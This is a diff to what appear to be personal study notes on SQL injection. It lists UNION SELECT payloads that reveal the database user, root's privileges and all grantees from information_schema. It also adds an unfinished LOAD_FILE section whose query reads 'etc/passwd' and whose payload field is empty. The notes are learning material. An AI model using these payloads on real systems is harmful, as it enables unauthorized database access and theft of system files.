@@ -66,5 +66,9 @@ Injection payload will be : `value' UNION SELECT 1, user(), 3, 4-- -` or `value'
 If we want to know about the privileges of a particular user, maybe 'root', so we'll use the payload as : `value' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
 
 `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -` : This payload is used to dump other privileges, we have directly from the schema.
-If I need to have information about a particular user, then it becomes : `
-cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+If I need to have information about a particular user, then it becomes : `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
+
+## LOAD_FILE Function
+Used to read data from files.
+Query : `SELECT LOAD_FILE('etc/passwd');`
+Payload : ``
